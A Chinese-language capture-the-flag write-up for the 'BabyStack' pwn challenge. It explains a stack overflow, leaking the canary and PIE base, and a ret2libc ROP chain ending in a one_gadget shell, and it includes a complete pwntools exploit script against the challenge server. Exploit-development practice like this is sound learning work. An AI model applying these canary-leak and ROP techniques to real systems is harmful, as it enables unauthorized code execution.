# BabyStack

题目来源：http://xmctf.top/

漏洞很明显，是一个栈溢出，BUF只有136，输入数据长度0x100（256）。

![5h60nP](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/5h60nP.png)

保护全开，不能覆盖got表。开了金丝雀，所以一般的ROP也用不了。

跑了一下，发现造成stack smash，一开始想到了这个技巧，不过似乎又没有什么用。

![U6LYWS](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/U6LYWS.png)

**canary和PIE偏移地址泄露**

后来发现第一次输出可以控制溢出字节，正好和canary拼接，第一次输出能够泄露canary地址。由于canary低位为0，读取时候会被截断，所以我们补一位\x01，这样就不会被截断了。

同时，后面还有init函数的地址同样可以泄漏，可以用于绕过PIE。

![gJdh5g](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/gJdh5g.png)

```python
#泄露canary
ru("What's your name:")
s("A"*(0x90-0x8)+"\x01")  # x/20xg $rbp-0x8-0x20   #\x01 is important

p.recv(8)
p.recv(0x90-2)
print "[*]canary="+hex(u64(p.recv(8))-1)
```

利用puts_plt读取puts_got来泄漏地址，当然，这些操作都建立在泄露ELF程序偏移地址绕过PIE之后。最后用传统的ROP泄露libc地址，最后one_gadget解决。

**EXP**

 ```python
#!/usr/bin/python
from pwn import *

#p=process("babystack")
p=remote("nc.eonew.cn",10501)

context.log_level='Debug'
#gdb.attach(p,"b *0x00005555555548e8")#8f2")
#gdb.attach(p,"b *0x0000555555554973")
#gdb.attach(p,"b *0x0000555555554907")
#gdb.attach(p,"b *0x7ffff7a332c5")
r  = lambda data	:p.recv(data)
ru = lambda data 	:p.recvuntil(data)
s  = lambda data	:p.send(data)
sl = lambda data	:p.sendline(data)

ru("What's your name:")
s("A"*(0x90-0x8)+"\x01")  # x/20xg $rbp-0x8-0x20   #\x01 is important

p.recv(8)
p.recv(0x90-2)
canary=u64(p.recv(8))-1
base_addr=u64(p.recv(6).ljust(8,"\x00"))-0x910
print "[*]canary="+hex(canary)
print "[*]base_addr="+hex(base_addr)

puts_plt=0x690+base_addr
puts_got=0x200fa8+base_addr
pop_rdi=0x973+base_addr

main=0x80a+base_addr

ru("What do you want to say:")
payload="B"*(0x90-0x8)+p64(canary)+"A"*0x8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
sl(payload)
p.recvline()
puts_addr=u64(p.recv(6).ljust(8,"\x00"))
libc_addr=puts_addr-0x809c0
print "[+]puts_addr="+hex(puts_addr)
print "[+]libc_addr="+hex(libc_addr)

one_gadget=libc_addr+0x4f2c5

ru("What's your name:")
sl("migraine")
ru("What do you want to say:")
payload="C"*(0x90-0x8)+p64(canary)+"A"*0x8+p64(one_gadget)
sl(payload)

p.interactive()

'''
0x7fffffffdf90

'''
 ```

以前没注意到 **one_gadget -l1  libc-2.27.so** 的-l参数可以输出更多one_gadgets..这次用上了

![EexSJD](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/EexSJD.png)

# 参考

https://bbs.ichunqiu.com/thread-47443-1-1.html

https://www.52pojie.cn/thread-932096-1-1.html